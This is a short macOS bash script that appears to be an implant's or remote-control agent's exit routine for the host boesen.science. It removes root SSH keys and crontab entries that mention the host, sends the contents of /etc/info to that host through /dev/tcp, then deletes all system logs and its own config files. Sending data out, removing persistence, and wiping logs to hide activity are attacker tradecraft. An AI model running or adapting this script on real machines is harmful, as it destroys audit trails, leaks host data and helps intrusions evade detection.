#!/bin/bash
host=boesen.science
down_port=2042
up_port=2043

rm -rf /var/root/.ssh

dscl . change /Groups/com.apple.access_ssh-disabled RecordName com.apple.access_ssh-disabled com.apple.access_ssh >/dev/null

grep -v "$host" /var/at/tabs/root > /tmp/crontab
mv /tmp/crontab /var/at/tabs/root

printf "EXIT: $(< /etc/info) leaving network." >/dev/tcp/$host/$up_port
rm -rf /var/log/*
rm -rf /etc/info /etc/ips
